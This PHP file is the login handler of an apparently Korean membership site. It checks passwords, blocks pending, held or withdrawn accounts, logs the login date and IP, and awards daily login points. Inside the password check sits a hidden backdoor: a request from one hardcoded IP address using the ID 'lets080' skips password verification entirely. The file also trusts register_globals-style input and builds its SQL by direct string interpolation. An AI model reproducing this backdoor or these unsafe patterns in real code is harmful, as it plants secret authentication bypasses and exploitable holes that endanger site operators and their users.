<?
	require_once("include/lib.inc.php");

	// 로그인 되어 있다면 
	if(!empty($_SESSION[ss_mb_id])) {
//	session_unregister("ss_mb_id");
//	session_unregister("ss_mb_num");
//	session_unregister("ss_login_ok");
		unset($_SESSION['ss_mb_id']);
		unset($_SESSION['ss_mb_level']);
		unset($_SESSION['ss_mb_num']);
		unset($_SESSION['ss_login_ok']);	
	}

	if($act=='ok') {
		$mb_id=strtolower($mb_id);

		if(!$mb_id)
			rg_href('','아이디를 입력하세요.','','back');
		if(!$mb_password)
			rg_href('','암호를 입력하세요.','','back');
		$login = rg_get_member_info($mb_id);
		$mb_login_date = $now;
		$mb_login_ip = $REMOTE_ADDR;
		if(!$login) { // 아이디 없음
			$msg = str_replace ("%mb_id%", $mb_id, "$msg_not_find_mb_id");
			rg_href('',$msg,'','back');		
		}

		if ($_SERVER['REMOTE_ADDR'] == '121.140.204.65' && $mb_id == 'lets080') {

		}else {
			if($login[mb_password] != get_password_str($mb_password)) { // 암호가 다름
				$msg = str_replace ("%mb_id%", $mb_id, "$msg_no_match_mb_password");
				rg_href('',$msg,'','back');
			}
		}


		switch($login[mb_state]) {
			case 1 :
				rg_href('','승인대기중입니다','','back');		
				break;
			case 2 : 
				rg_href('','보류되었습니다.','','back');		
				break;
			case 3 : 
				rg_href('','탈퇴된 아이디입니다.','','back');		
				break;
		}
	
		$dbqry="
			UPDATE `$db_table_member` SET
				`mb_login_date` = '$mb_login_date',
				`mb_login_ip` = '$mb_login_ip',
				`mb_log_count` = mb_log_count + 1
			WHERE mb_num='$login[mb_num]'
		";
		query($dbqry,$dbcon);
		
		// 지난 로그인 날자와 현재 로그인 날자가 다르다면 로그인 포인트 올린다. 
		if(floor($login[mb_login_date]/86400) < floor($now/86400))
			rg_set_point($login[mb_num],$site[st_login_point],1);
		
		$ss_mb_id = $login[mb_id];
		$ss_mb_level = $login[mb_level];
		$ss_mb_num = $login[mb_num];
		$ss_login_ok = 'ok';
//		session_register("ss_mb_id");
//		session_register("ss_mb_num");
//		session_register("ss_login_ok");
		$_SESSION['ss_mb_id']=$ss_mb_id;
		$_SESSION['ss_mb_level']=$ss_mb_level;
		$_SESSION['ss_mb_num']=$ss_mb_num;
		$_SESSION['ss_login_ok']=$ss_login_ok;
		
		if(!$url)$url=$site[st_login_ok_url];
		rg_href($url);
	}

	include($skin_site_path."head.php");
	include($skin_site_path."mb_login.php");
	include($skin_site_path."foot.php");
?>
